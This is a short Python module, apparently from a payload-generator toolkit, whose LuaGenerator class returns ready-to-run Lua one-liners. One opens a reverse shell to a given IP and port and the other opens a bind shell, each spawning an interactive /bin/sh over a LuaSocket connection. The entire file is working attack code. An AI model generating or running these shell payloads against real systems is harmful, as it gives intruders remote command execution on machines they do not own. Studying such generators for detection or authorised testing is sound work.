"""
Lua reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class LuaGenerator(PayloadGenerator):
    """Standard LuaSocket reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"lua -e \"require('socket');"
            f"require('os');"
            f"t=socket.tcp();"
            f"t:connect('{ip}','{port}');"
            f"os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        )

    def bind(self, port: int) -> str:
        return (
            f"lua -e \"require('socket');"
            f"require('os');"
            f"s=socket.bind('*',{port});"
            f"c=s:accept();"
            f"os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        )

    def file_extension(self) -> str:
        return ".lua"
